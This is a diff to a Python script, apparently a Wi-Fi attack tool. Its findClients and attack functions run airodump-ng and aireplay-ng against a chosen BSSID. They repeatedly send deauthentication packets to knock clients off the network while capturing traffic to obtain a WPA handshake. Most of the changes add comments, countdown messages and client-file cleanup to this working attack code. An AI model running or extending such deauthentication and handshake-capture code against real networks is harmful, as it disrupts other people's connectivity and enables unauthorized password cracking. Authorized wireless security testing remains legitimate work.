@@ -268,19 +268,52 @@ def findClients(target):
     Name = target[3]
     fileName = 'clients/clients_'+Name
     interface = getInterface(0)
-
+    # Commands - airodump-ng: capture clients & aireplay-ng: deauth network
     command_1 = ['airodump-ng', '-K', '1', '-c', Channel, '--bssid', BSSID, '-w', fileName, '--output-format', 'csv', interface]
     command_2 = ['aireplay-ng','--deauth','5','-a',BSSID,interface]
-
+    # Run command - airodump-ng: save output to CSV file in 'clients' directory  
     process = sp.Popen(command_1, stdout=sp.PIPE, text=True)
+    # Run both processes for about 30 seconds
     print(Fore.YELLOW, 'Searching for clients...(30sec)')
     t.sleep(3)
+    print(Fore.YELLOW, 'Searching for clients...(27sec)')
+    t.sleep(3)
+    print(Fore.YELLOW, 'Searching for clients...(24sec)')
     sp.run(command_2, stdout=sp.DEVNULL)
-    t.sleep(27)
+    t.sleep(3)
+    print(Fore.YELLOW, 'Searching for clients...(21sec)')
+    t.sleep(3)
+    print(Fore.YELLOW, 'Searching for clients...(18sec)')
+    t.sleep(3)
+    print(Fore.YELLOW, 'Searching for clients...(15sec)')
+    sp.run(command_2, stdout=sp.DEVNULL)
+    t.sleep(3)
+    print(Fore.YELLOW, 'Searching for clients...(12sec)')
+    t.sleep(3)
+    print(Fore.YELLOW, 'Searching for clients...(9sec)')
+    t.sleep(3)
+    print(Fore.YELLOW, 'Searching for clients...(6sec)')
+    sp.run(command_2, stdout=sp.DEVNULL)
+    t.sleep(3)
+    print(Fore.YELLOW, 'Searching for clients...(3sec)')
+    t.sleep(3)
+    print(Fore.YELLOW, 'Searching for clients...(0sec)')
+    # Send CTRL+C to process
     process.send_signal(signal.SIGINT)
-    sp.run(['cat',fileName+'.csv'])
 
-
+    # ---------- Find client file ----------
+    process = sp.run(['ls', 'clients'], capture_output=True, text=True)
+    ls = process.stdout.splitlines()
+    print(ls)
+    print('size of list:', ls.__len__())
+    for f in ls:
+        print(f)
+    if ls.__len__() > 1:
+        # ls.remove(ls[0])
+        sp.run(['rm','clients/'+ls[0]])
+        print(Fore.YELLOW, 'Warning: more than one client file!') # This should never be displayed
+    print(ls)
+    
 def attack(target):
     # internal variables - BSSID, Channel, Name, & fileName
     BSSID = target[0]
@@ -293,13 +326,12 @@ def attack(target):
     command_1 = ['airodump-ng','-K','1','-c',Channel,'--bssid',BSSID,'-w',fileName,'--output-format','cap',interface]
     command_2 = ['aireplay-ng','--deauth','5','-a',BSSID,interface]
 
-    # print(command_1)
-
+    # Run command - airodump-ng: output hidden
     process_1 = sp.Popen(command_1, stdout=sp.DEVNULL)
     print(Fore.YELLOW,'Listening...')
     t.sleep(2)
+    # Run command - aireplay-ng: output hidden
     sp.run(command_2, stdout=sp.DEVNULL)
-    # process_2 = sp.Popen(command_2)
 
     t.sleep(2)
     print(Fore.RED,'Attacking network...')
@@ -330,6 +362,7 @@ def attack(target):
     t.sleep(2)
     print(Fore.RED,'Attacking network...')
     
+    # Send CTRL+C to process
     process_1.send_signal(signal.SIGINT)
 
     # TODO: Add handshake captured printout
